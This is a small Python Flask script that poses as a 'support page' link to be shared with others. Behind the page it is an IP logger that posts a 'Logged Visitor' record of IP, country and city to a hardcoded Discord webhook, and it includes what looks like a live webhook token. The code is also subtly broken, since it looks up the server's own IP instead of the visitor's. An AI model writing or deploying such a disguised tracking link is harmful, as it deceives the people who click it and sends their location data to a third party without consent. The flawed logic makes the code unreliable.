import requests
from flask import Flask, request
import json
import socket

app = Flask(__name__)

# NEW webhook (placeholder — replace with your actual one)
WEBHOOK_URL = "https://discord.com/api/webhooks/1396579518084284487/k_MXSeL1FTBs-vVitN-iSgHWBq8GLjajqvrvkq0KJEf6ip-Kusjsb6NTVfFBLmIaPmmm"

# Function to send data to Discord Webhook
def send_to_webhook(ip, country, city):
    data = {
        "content": f"📡 Logged Visitor\nIP: `{ip}`\nCountry: `{country}`\nCity: `{city}`"
    }
    response = requests.post(WEBHOOK_URL, json=data)
    if response.status_code == 204:
        print("[✓] Data sent successfully.")
    else:
        print("[!] Failed to send data.")

# Route that triggers IP logging
@app.route('/support', methods=['GET'])
def logged():
    ip_data = requests.get("https://ipinfo.io/json").json()

    ip = ip_data.get("ip", "Unknown")
    country = ip_data.get("country", "Unknown")
    city = ip_data.get("city", "Unknown")

    send_to_webhook(ip, country, city)
    
    return "Support page loaded.", 200

# Start the server and print link
if __name__ == "__main__":
    port = 5000
    host_name = socket.gethostname()
    local_ip = socket.gethostbyname(host_name)
    print(f"\n[INFO] Share this link: http://{local_ip}:{port}/support\n")
    app.run(host="0.0.0.0", port=port)
